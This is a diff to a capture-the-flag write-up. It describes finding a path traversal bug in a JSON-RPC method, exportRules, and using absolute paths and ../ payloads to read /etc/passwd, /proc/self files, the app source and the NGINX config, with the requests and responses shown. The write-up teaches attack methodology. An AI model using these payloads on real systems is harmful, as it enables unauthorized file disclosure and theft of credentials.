@@ -72,47 +72,162 @@ HTTP/1.1 403 Forbidden
 
 # Source Disclosure: exportRules Traversal
 
-Method `exportRules` takes export name and does `join(export_dir, name)` with no `..` check.
+Writers always skip this step with one sentence: "then `exportRules` had traversal, read the source." That hides the only question that matters on a blackbox: how did you know to look at `exportRules` at all?
+
+## listCapabilities has 24 entries, not 8
+
+That screenshot above shows 8. The response has 24, and the three privileged methods sit at the bottom, which is the worst place to start because they are exactly the ones NGINX blocks. Chasing them is how you end up three hours deep in parser differentials.
+
+Sort by parameter shape instead:
+
+| Signal | Methods | Why |
+|---|---|---|
+| a string that names a file (`name?`, `file`, `path`, `log`) | `exportRules` | user value that may hit the filesystem |
+| file verb: `export` `download` `backup` `snapshot` | `exportRules` | exporters read a path |
+| `scope: public` | `exportRules` | testable as plain `role:user` |
+| `id` only | `saveScene`, `setRuleEnabled`, `deleteRule` | not file sinks, but IDOR candidates |
+
+Same table works on any JSON-RPC target: every param a human would call a filename is an untrusted path until you read the handler.
+
+## ExportRules Takes A Name
+
+The capability object hands it over:
 
 ```json
-{"method":"exportRules","name":"../../../../app/app.py"}
-{"method":"exportRules","name":"../../../../etc/nginx/nginx.conf"}
+{"method": "exportRules", "scope": "public", "params": ["name?"],
+ "summary": "Snapshot the current rules to a bundle, or download a saved bundle by name."}
 ```
 
-<img width="1492" height="737" alt="image" src="https://github.com/user-attachments/assets/633b9125-737c-4f30-a946-c65b0702ac2b" />
+`name?` is one attacker-controlled string. "download a saved bundle by name" means the handler resolves it, and anything an exporter resolves is a path. The bug was never hidden, it was in a field you skip because you grep for `privileged`.
+
+## The Error Echoes Your Input
+
+Baseline it before attacking:
+
+```json
+{"method":"exportRules"}
+{"method":"exportRules","name":"rules.json"}
+{"method":"exportRules","name":"nope.json"}
+```
+
+```text
+no name     -> {"ok":true,"file":"<you>.json","bundle":{...}}
+rules.json  -> {"ok":false,"error":"no export named rules.json"}
+nope.json   -> {"ok":false,"error":"no export named nope.json"}
+```
+
+`no export named rules.json` contains the exact string I sent. That is `open(X)` raising and the handler echoing the argument. First hard evidence the param is a path.
+
+The oracle it gives you, with limits:
+
+| Input | Result |
+|---|---|
+| readable file | `{"ok":true,"content":"..."}` |
+| missing file | `no export named X` |
+| directory (`/etc`) | `no export named /etc` -- `IsADirectoryError` swallowed |
+| symlink to dir (`/proc/self/cwd`) | same error, so it is `open()` not `listdir()` |
+| file over 64 KiB | cut at exactly 65536, no warning |
+| binary | valid JSON, 20038 replacement chars out of 65536 |
+
+All of it is HTTP 200 with `ok:false`. Status code carries no signal here, you have to read the body.
+
+## Absolute Path Beats ../
+
+Instinct says `../../../../app/app.py`. Don't count yet. The bug is `os.path.join(base, user_value)` and join has one behavior that beats everything:
+
+```python
+os.path.join("/app/data/exports", "/etc/passwd")   # -> "/etc/passwd"
+```
+
+An absolute second arg throws the base away:
+
+```json
+{"method":"exportRules","name":"/etc/passwd"}
+```
+
+```text
+{"ok":true,"content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
+```
+
+One request, no depth arithmetic. Every `../` I would have written was me compensating for not knowing the API.
+
+## Ask The Process Where It Lives
+
+```json
+{"method":"exportRules","name":"/proc/self/environ"}
+```
+
+```text
+PWD=/app
+```
+
+```json
+{"method":"exportRules","name":"/proc/self/cmdline"}
+```
+
+```text
+/usr/local/bin/python3.12 /usr/local/bin/gunicorn --preload -w 1 -b 0.0.0.0:5000 app:app
+```
+
+`PWD=/app` and `app:app`, so depth is arithmetic not guessing. Exports live in `/app/data/exports`, three levels down:
+
+| `name` | Result |
+|---|---|
+| `../etc/passwd` | `no export named` |
+| `../../etc/passwd` | `no export named` |
+| `../../../etc/passwd` | content |
+| `/etc/passwd` | content |
+
+`..%2f` and `....//` both failed too. Value comes from a JSON body, there is no URL decoding in the path, so filter bypasses for `../` are dead weight here.
+
+## The Dump
+
+```json
+{"method":"exportRules","name":"/app/app.py"}
+{"method":"exportRules","name":"/etc/nginx/nginx.conf"}
+```
+
+<img width="1495" height="742" alt="image" src="https://github.com/user-attachments/assets/fa0fbc74-1b83-4667-afc3-8bef6b0c877c" />
+
+Check it is the running code, not a decoy, by matching lines against what you already measured:
+
+| Source says | I already knew |
+|---|---|
+| `return 403 '{"error":"method not permitted"}'` | exact 403 body, byte for byte, and Flask has no 403 anywhere in it |
+| `client_max_body_size 1024` | 1023 and 1024 give 403, 1025 gives 413 |
+| `fh.read(MAX_EXPORT)` = 65536 | `/bin/ls` came back exactly 65536 |
+| `server backend:5000` | only 30001 is open outside, 5000 and 8080 are not |
+| `p.unlink(missing_ok=True)` | `/run/hub/flag` is not readable |
+
+If a recovered file contradicts something you measured yourself, you are reading the wrong file.
+
+## The Flag File Is Gone
+
+The source killed more work than it gave me:
+
+```python
+FLAG = _secret("flag", "HM_no_flag_set").strip()
+```
+
+```python
+def _secret(name, default):
+    p = _SECRETS / name
+    if not p.exists():
+        return default
+    v = p.read_text()
+    p.unlink(missing_ok=True)
+    return v
+```
+
+Read into a global at import, then deleted. Confirmed, `/run/hub/flag` is not there at any point.
+
+So the file read was never the exploit, it was the map. Every instinct says spray `/flag`, `/flag.txt`, `/run/hub/flag`. Those are all dead, the only copy left is the `FLAG` variable in memory, and the one method that returns it is the one NGINX blocks.
 
 **What does this mean?**
 
 We don't need to guess anymore. The server hands us its own source code and its own proxy config. `app.py` tells us what Flask will accept. `nginx.conf` tells us what NGINX will block. The bug is the gap between them.
 
-# What Flask Does
-
-From `app.py`, Flask does 5 steps in order:
-
-```python
-1. body.decode('utf-8')  # must be UTF-8, UTF-16/32 die here
-2. json.loads(..., object_pairs_hook=reject_duplicates)  # dup keys -> malformed
-3. check top-level keys are in allowlist for that method
-4. if method not in [login,register,logout,whoami]: require session
-5. dispatch to handler
-```
-
-**unlockDoor handler:**
-
-```python
-device must exist and type == "lock"  # front_door passes
-duration optional, default 60, must be finite float
-return {"ok":true, "lock":"released", "entry_code": FLAG}
-FLAG = _secret("flag", ...) then unlink(/run/hub/flag)
-```
-
-**What does this mean?**
-
-- No role check. scope: "privileged" is just a label, never enforced. Any logged-in user who reaches this function gets the flag.
-- Very strict JSON: no duplicates, only method,device,duration, finite numbers only, UTF-8 only.
-- /run/hub/flag is deleted after boot. Only copy is in memory. You must call `unlockDoor`.
-
-Flask alone is open. Something in front is stopping us.
+A public method took a string called `name`, the error message echoed it back, and one `os.path.join` later the whole challenge was open.
 
 # What NGINX Does
 
